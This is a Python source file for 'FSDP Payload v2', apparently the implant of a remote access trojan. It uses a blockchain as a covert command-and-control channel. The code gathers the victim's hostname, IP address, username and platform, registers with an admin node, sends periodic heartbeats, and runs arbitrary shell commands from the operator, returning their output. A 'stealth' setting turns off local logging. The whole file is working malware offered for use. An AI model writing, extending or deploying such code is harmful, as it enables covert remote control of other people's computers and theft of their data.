#!/usr/bin/env python3
"""
FSDP Payload v2 - Works with Admin GUI v2
Improved communication through blockchain
"""

import sys
import os
import time
import socket
import platform
import subprocess
import uuid
import json
from datetime import datetime
import threading

# Add path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from fsdp.blockchain.chain import FSDPBlockchain
    from fsdp.protocol.fsdp_protocol import FSDPProtocol, MessageType
except ImportError:
    print("ERROR: FSDP modules not found!")
    print("Make sure you're running from the rat_full_sessions directory")
    sys.exit(1)

# ============================================================
# CONFIGURATION
# ============================================================

# CHANGE THIS to your validator IP address
BLOCKCHAIN_NODE = "localhost:5000"  # Change to validator IP (e.g., "192.168.1.100:5000")

# Debug mode - set to False for stealth
DEBUG = True

# Heartbeat interval (seconds)
HEARTBEAT_INTERVAL = 30

# ============================================================
# LOGGING
# ============================================================

def setup_logging():
    """Setup logging to file"""
    if DEBUG:
        log_dir = os.path.expanduser("~/.fsdp_logs")
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, f"payload_{datetime.now().strftime('%Y%m%d')}.log")
        
        class Logger:
            def __init__(self, filename):
                self.terminal = sys.stdout
                self.log = open(filename, "a", encoding='utf-8')
            
            def write(self, message):
                self.terminal.write(message)
                self.log.write(message)
                self.log.flush()
            
            def flush(self):
                self.terminal.flush()
                self.log.flush()
        
        sys.stdout = Logger(log_file)
        sys.stderr = Logger(log_file)

def log(level, message):
    """Log a message"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] [{level}] [FSDP-Payload-v2] {message}")

# ============================================================
# SYSTEM INFORMATION
# ============================================================

def get_system_info():
    """Get system information"""
    try:
        hostname = socket.gethostname()
        
        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except:
            ip_address = "127.0.0.1"
        
        info = {
            'payload_id': str(uuid.uuid4()),
            'hostname': hostname,
            'ip_address': ip_address,
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'username': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            'home_directory': os.path.expanduser('~'),
            'current_directory': os.getcwd()
        }
        
        return info
    except Exception as e:
        log("ERROR", f"Failed to get system info: {e}")
        return {}

# ============================================================
# TERMINAL MANAGER
# ============================================================

class TerminalManager:
    """Manages multiple isolated terminals"""
    
    def __init__(self):
        self.terminals = {}
        log("INFO", "Terminal Manager initialized")
    
    def create_terminal(self, terminal_id):
        """Create a new terminal"""
        self.terminals[terminal_id] = {
            'id': terminal_id,
            'cwd': os.getcwd(),
            'env': os.environ.copy(),
            'created_at': time.time()
        }
        log("INFO", f"Terminal created: {terminal_id}")
        return self.terminals[terminal_id]
    
    def execute_command(self, terminal_id, command):
        """Execute command in terminal"""
        if terminal_id not in self.terminals:
            return {
                'success': False,
                'error': 'Terminal not found',
                'output': '',
                'exit_code': -1
            }
        
        terminal = self.terminals[terminal_id]
        
        try:
            log("DEBUG", f"Executing in {terminal_id}: {command}")
            
            # Handle cd command
            if command.strip().startswith('cd '):
                path = command.strip()[3:].strip()
                try:
                    if path:
                        os.chdir(path)
                    terminal['cwd'] = os.getcwd()
                    return {
                        'success': True,
                        'output': f"Changed directory to: {terminal['cwd']}\n",
                        'error': '',
                        'exit_code': 0,
                        'cwd': terminal['cwd']
                    }
                except Exception as e:
                    return {
                        'success': False,
                        'output': '',
                        'error': f"cd: {str(e)}\n",
                        'exit_code': 1,
                        'cwd': terminal['cwd']
                    }
            
            # Execute command
            start_time = time.time()
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=terminal['cwd'],
                env=terminal['env'],
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=60)
            exit_code = process.returncode
            
            execution_time = time.time() - start_time
            
            log("DEBUG", f"Command completed in {execution_time:.2f}s with exit code {exit_code}")
            
            return {
                'success': exit_code == 0,
                'output': stdout,
                'error': stderr,
                'exit_code': exit_code,
                'cwd': terminal['cwd'],
                'execution_time': execution_time
            }
            
        except subprocess.TimeoutExpired:
            process.kill()
            return {
                'success': False,
                'output': '',
                'error': 'Command timeout (60s)\n',
                'exit_code': -1,
                'cwd': terminal['cwd']
            }
        except Exception as e:
            log("ERROR", f"Command execution error: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e) + '\n',
                'exit_code': -1,
                'cwd': terminal['cwd']
            }

# ============================================================
# FSDP PAYLOAD
# ============================================================

class FSDPPayload:
    """Main payload class"""
    
    def __init__(self):
        self.system_info = get_system_info()
        self.payload_id = self.system_info.get('payload_id', str(uuid.uuid4()))
        
        # Initialize blockchain
        self.blockchain = FSDPBlockchain(node_id=self.payload_id, is_validator=False)
        self.protocol = FSDPProtocol(self.blockchain, self.payload_id, "target")
        
        # Initialize terminal manager
        self.terminal_manager = TerminalManager()
        
        # State
        self.running = False
        self.sessions = {}
        
        log("INFO", "=" * 60)
        log("INFO", "FSDP Payload v2 Initialized")
        log("INFO", "=" * 60)
        log("INFO", f"Payload ID: {self.payload_id}")
        log("INFO", f"Hostname: {self.system_info.get('hostname', 'Unknown')}")
        log("INFO", f"Platform: {self.system_info.get('platform', 'Unknown')}/{self.system_info.get('architecture', 'Unknown')}")
        log("INFO", f"IP Address: {self.system_info.get('ip_address', 'Unknown')}")
        log("INFO", f"Debug Mode: {DEBUG}")
        log("INFO", "=" * 60)
    
    def start(self):
        """Start the payload"""
        log("INFO", "Starting FSDP Payload v2...")
        
        self.protocol.start()
        self.running = True
        
        # Send initial registration
        self.send_registration()
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Start command listener thread
        listener_thread = threading.Thread(target=self.command_listener, daemon=True)
        listener_thread.start()
        
        log("INFO", "Payload started successfully")
        log("INFO", f"Connecting to blockchain node: {BLOCKCHAIN_NODE}")
        
        # Main loop
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            log("INFO", "Payload interrupted by user")
            self.stop()
    
    def stop(self):
        """Stop the payload"""
        log("INFO", "Stopping payload...")
        self.running = False
        self.protocol.stop()
        log("INFO", "Payload stopped")
    
    def send_registration(self):
        """Send registration to blockchain"""
        try:
            # Add transaction to blockchain
            self.blockchain.add_transaction(
                from_node=self.payload_id,
                to_node="*",  # Broadcast
                tx_type="register",
                data=self.system_info
            )
            
            log("INFO", "Registration sent to blockchain")
        except Exception as e:
            log("ERROR", f"Failed to send registration: {e}")
    
    def heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                self.blockchain.add_transaction(
                    from_node=self.payload_id,
                    to_node="*",
                    tx_type="heartbeat",
                    data={
                        'hostname': self.system_info.get('hostname'),
                        'ip_address': self.system_info.get('ip_address'),
                        'platform': self.system_info.get('platform'),
                        'timestamp': time.time()
                    }
                )
                
                log("DEBUG", "Heartbeat sent")
                
            except Exception as e:
                log("ERROR", f"Heartbeat error: {e}")
            
            time.sleep(HEARTBEAT_INTERVAL)
    
    def command_listener(self):
        """Listen for commands from blockchain"""
        last_block = 0
        
        while self.running:
            try:
                # Check for new blocks
                current_block = self.blockchain.get_chain_length()
                
                if current_block > last_block:
                    # Process new blocks
                    for block_index in range(last_block, current_block):
                        if block_index < len(self.blockchain.chain):
                            block = self.blockchain.chain[block_index]
                            self.process_block(block)
                    
                    last_block = current_block
                
            except Exception as e:
                log("ERROR", f"Command listener error: {e}")
            
            time.sleep(2)
    
    def process_block(self, block):
        """Process a blockchain block"""
        try:
            for tx in block.data.get('transactions', []):
                # Check if transaction is for us
                to_node = tx.get('to')
                if to_node == self.payload_id or to_node == "*":
                    self.handle_transaction(tx)
        except Exception as e:
            log("ERROR", f"Block processing error: {e}")
    
    def handle_transaction(self, tx):
        """Handle a transaction"""
        try:
            tx_type = tx.get('type')
            data = tx.get('data', {})
            from_node = tx.get('from')
            
            log("DEBUG", f"Received transaction: {tx_type} from {from_node[:16]}...")
            
            if tx_type == 'session_open':
                self.handle_session_open(data, from_node)
            elif tx_type == 'terminal_create':
                self.handle_terminal_create(data, from_node)
            elif tx_type == 'terminal_command':
                self.handle_terminal_command(data, from_node)
            elif tx_type == 'session_close':
                self.handle_session_close(data, from_node)
            
        except Exception as e:
            log("ERROR", f"Transaction handling error: {e}")
    
    def handle_session_open(self, data, from_node):
        """Handle session open request"""
        session_id = data.get('session_id')
        
        if session_id:
            self.sessions[session_id] = {
                'admin_id': from_node,
                'created_at': time.time(),
                'terminals': {}
            }
            
            log("INFO", f"Session opened: {session_id}")
            
            # Send acknowledgment
            self.blockchain.add_transaction(
                from_node=self.payload_id,
                to_node=from_node,
                tx_type="session_opened",
                data={'session_id': session_id, 'status': 'success'}
            )
    
    def handle_terminal_create(self, data, from_node):
        """Handle terminal create request"""
        session_id = data.get('session_id')
        terminal_id = data.get('terminal_id')
        
        if session_id in self.sessions and terminal_id:
            terminal = self.terminal_manager.create_terminal(terminal_id)
            self.sessions[session_id]['terminals'][terminal_id] = terminal
            
            log("INFO", f"Terminal created: {terminal_id} in session {session_id}")
            
            # Send acknowledgment
            self.blockchain.add_transaction(
                from_node=self.payload_id,
                to_node=from_node,
                tx_type="terminal_created",
                data={
                    'session_id': session_id,
                    'terminal_id': terminal_id,
                    'cwd': terminal['cwd']
                }
            )
    
    def handle_terminal_command(self, data, from_node):
        """Handle terminal command"""
        session_id = data.get('session_id')
        terminal_id = data.get('terminal_id')
        command = data.get('command')
        
        if session_id in self.sessions and terminal_id and command:
            log("INFO", f"Executing command: {command[:50]}...")
            
            result = self.terminal_manager.execute_command(terminal_id, command)
            
            # Send result back
            self.blockchain.add_transaction(
                from_node=self.payload_id,
                to_node=from_node,
                tx_type="terminal_output",
                data={
                    'session_id': session_id,
                    'terminal_id': terminal_id,
                    'command': command,
                    'output': result.get('output', ''),
                    'error': result.get('error', ''),
                    'exit_code': result.get('exit_code', -1),
                    'cwd': result.get('cwd', '')
                }
            )
            
            log("INFO", f"Command result sent (exit code: {result.get('exit_code')})")
    
    def handle_session_close(self, data, from_node):
        """Handle session close request"""
        session_id = data.get('session_id')
        
        if session_id in self.sessions:
            del self.sessions[session_id]
            log("INFO", f"Session closed: {session_id}")

# ============================================================
# MAIN
# ============================================================

def main():
    """Main entry point"""
    
    # Setup logging
    setup_logging()
    
    log("INFO", "=" * 60)
    log("INFO", "FSDP PAYLOAD V2")
    log("INFO", "=" * 60)
    log("INFO", f"Blockchain Node: {BLOCKCHAIN_NODE}")
    log("INFO", f"Debug Mode: {DEBUG}")
    log("INFO", f"Python Version: {platform.python_version()}")
    log("INFO", f"Platform: {platform.system()} {platform.release()}")
    log("INFO", "=" * 60)
    
    try:
        payload = FSDPPayload()
        payload.start()
    except KeyboardInterrupt:
        log("INFO", "Payload stopped by user")
    except Exception as e:
        log("ERROR", f"Fatal error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()

